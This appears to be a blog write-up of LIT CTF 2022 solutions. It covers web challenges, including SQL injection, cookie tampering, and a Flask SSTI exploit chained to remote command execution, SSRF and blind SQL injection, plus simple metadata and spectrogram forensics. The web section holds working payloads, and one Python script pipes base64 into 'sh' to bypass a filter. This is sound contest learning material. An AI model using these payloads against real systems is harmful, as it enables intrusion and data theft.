---
title: LIT CTF 2022
date: 2022-07-25 19:45:37
tags: ['voynich', 'CTF']
categories: ['CTF', 'security', 'writeup']
---
LIT(Lexington Informatics Tournament) is a competitive programming tournament for middle/high school students,
hosted by members of the LexMACS club along with many guest problemsetters/testers.
 
## Web

* Guess The Pokemon
* Kevin's Cookies
* EYANGCH Fan Art Maker
* Flushed Emoji 

### Guess The Pokemon
If you check the code, you will see that there is a sql injection vulnerability in it
```python
cur.execute("SELECT * FROM pokemon WHERE names=" + name + "")
```
payload 
```sql
1 OR 1=1--
```

```
LITCTF{flagr3l4t3dt0pok3m0n0rsom3th1ng1dk}
```

### Kevin's Cookies

In cookies, there is a key called likeCookie whose value is false.
If we change the value to true, we will see the following message.

```
Oh silly you. What do you mean you like a true cookie?
I have 20 cookies numbered from 1 to 20, and all of them are made from super true authentic recipes.
```

script

```python
import requests

url = "http://litctf.live:31778/"

for i in range(20):
	r = requests.get(url, cookies={"likeCookie":str(i)})
	if "LITCTF{" in r.text:
		print("likeCookie : ", i)
		break
```

```
LITCTF{Bd1mens10n_15_l1k3_sup3r_dup3r_0rzzzz}
```

### EYANGCH Fan Art Maker

In this challenge, we only need to change the location of the flag component
```xml
<flag x="200" y="450"></flag>
```

```
LITCTF{wh4t_d03s_CH_1n_EyangCH_m3an???}
```

### Flushed Emoji

This challenge has several vulnerabilities.
The first vulnerability is related to the password field.
If you check the code, you will notice the vulnerability of SSTI

```python
return render_template_string("ok thank you for your info i have now sold your password (" + password + ") for 2 donuts :)");
```

For example, if you enter the following payload
```python
{{2+2}}

4
```

There is also a sql injection vulnerability in the `data-server` project

```python
x = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
```

Now we use SSTI to execute command

```python
{{config['__class__']['__init__']['__globals__']['os']|attr('popen')('ls')|attr('read')()}}
```

```
curl -X POST "http://litctf.live:31781" -d "username=&password={{config['__class__']['__init__']['__globals__']['os']|attr('popen')('ls')|attr('read')()}}"


ok thank you for your info i have now sold your password (main.py
requirements.txt
run.sh
static
templates
) for 2 donuts :)
```

If we print the main.py file, we will encounter the address http://172.24.0.8:8080/runquery, this address is not accessible from the outside,
and this shows that we do not have access to the data-server program from the outside.

In the next step, we should send requests containing sql to the address http://172.24.0.8:8080/runquery

```python
import requests
import base64

char = list(".*+,!#$%&0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-{}")

url = "http://litctf.live:31781"
internal_url = "http://172.24.0.8:8080/runquery"

ssti_payload  = "{{config['__class__']['__init__']['__globals__']['os']|attr('popen')('%s')|attr('read')()}}"
rce_payload   = "echo {}| base64 -d | sh"
python_script = "python3 -c \"import json,requests;print(requests.post('%s', data=json.dumps({'username':'%s','password':'0'}), headers={\\\"Content-type\\\": \\\"application/json\\\"}).text)\""
sql_payload   = "flag\\'and (Select hex(substr(password,1,{})) from users limit 1 offset 0) = hex(\\\'{}\\\')--"

flag = "LITCTF{"

for c in range(len(char)):
	for i in range(len(char)):
		tmp = flag+char[i]
		
		script = python_script % (internal_url, sql_payload.format(len(flag)+1,tmp))
		script = str(base64.b64encode(script.encode("utf-8")), "utf-8")
		payload = ssti_payload % rce_payload.format(script)
		
		r = requests.post(url, data={"username":"","password":payload})
		if "True" in r.text:
			flag += char[i]
			print("FLAG : "+ flag)
			break
```

* There are a few points in the script above
	* Because there is no curl in the server, we had to use a python script to send the request.
	* The server filters the character "." , to bypass this filter I coded the script with base64.

![Flushed Emoji](/assets/post/LITCTF2022/FlushedEmoji.png)

## misc

* CodeTiger orz Is Meta
* kirby!!!

### CodeTiger orz Is Meta

```
strings ./codetigerfanpic.png

<x:xmpmeta xmlns:x='adobe:ns:meta/' x:xmptk='Image::ExifTool 12.36'>
<rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'>
 <rdf:Description rdf:about=''
  xmlns:dc='http://purl.org/dc/elements/1.1/'>
  <dc:description>
   <rdf:Alt>
    <rdf:li xml:lang='x-default'>t1g2r_</rdf:li>
   </rdf:Alt>
  </dc:description>
  <dc:rights>
   <rdf:Alt>
    <rdf:li xml:lang='x-default'>orz}</rdf:li>
   </rdf:Alt>
  </dc:rights>
  <dc:title>
   <rdf:Alt>
    <rdf:li xml:lang='x-default'>LITCTF{c0de_</rdf:li>
   </rdf:Alt>
  </dc:title>
 </rdf:Description>
</rdf:RDF>
</x:xmpmeta>
<?xpacket end='r'?>
```

```
LITCTF{c0de_t1g2r_orz}
```

### kirby!!!

This challenge contains a sound file that I opened with `sonic visualizer` and added the `spectrogram` layer


![kirby!!!](/assets/post/LITCTF2022/kirby.png)

```
LITCTF{K1RBY1SCOOL!}
```